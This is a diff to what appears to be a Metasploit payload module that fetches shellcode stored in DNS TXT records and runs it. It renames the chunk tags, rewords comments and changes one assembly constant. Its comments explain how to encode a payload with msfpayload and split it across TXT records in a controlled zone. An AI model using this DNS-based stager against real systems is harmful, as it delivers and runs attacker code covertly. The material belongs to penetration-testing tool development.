@@ -37,7 +37,7 @@ module Metasploit3
 		register_options(
 			[
 				OptString.new('DNSZONE', [ true, "The DNS zone to query" ]),
-				OptInt.new('PARTS', [ true, "The number of TXT records to retrieve", 3]),
+				OptInt.new('PARTS', [ true, "The number of TXT records that contain shellcode", 3]),
 			], self.class)
 	end
 
@@ -48,7 +48,7 @@ module Metasploit3
 	#   Example : 
 	# ./msfpayload windows/messagebox TITLE="Friendly message from corelanc0d3r" TEXT="DNS Payloads FTW" R | ./msfencode -e x86/alpha_mixed Bufferregister=EDI -t raw
 	#   Output : 654 bytes
-	# 2. Split the output into parts of 250 bytes (+ remaining bytes)
+	# 2. Split the output into parts of 250 bytes (+ remaining bytes as last part)
 	#   In case of 654 bytes of payload, there will be 2 parts of 250 bytes, and one part of 154 bytes
 	# 3. Create the TXT records in a zone you control and put in the tag (see later) + 250 bytes of the payload per TXT record
 	#   The last TXT record will have less than 250 bytes, that's fine
@@ -58,9 +58,9 @@ module Metasploit3
 	#
 	#
 	# TAGS :
-	# 1par : tag in front of first part	(tag + 250 bytes)
-	# 2par : tag in front of second part	(tag + 250 bytes  (or remaining bytes))
-	# 3par : tag in front of third part	(tag + 250 bytes  (or remaining bytes))
+	# 1-pt : 4 byte tag in front of first part	(tag + 250 bytes)
+	# 2-pt : 4 byte tag in front of second part	(tag + 250 bytes  (or remaining bytes))
+	# 3-pt : 4 byte tag in front of third part	(tag + 250 bytes  (or remaining bytes))
 	# etc
 
 	#
@@ -230,7 +230,7 @@ alloc_space:
 	push eax		; save pointer, twice
 	push eax
 	mov edx,#{bufferreg}
-	mov eax,0x72617030	; 0par
+	mov eax,0x74702d30	; 0-pt
 	mov dh,bh
 	mov dl,03		; start startlocation of search in edx
 
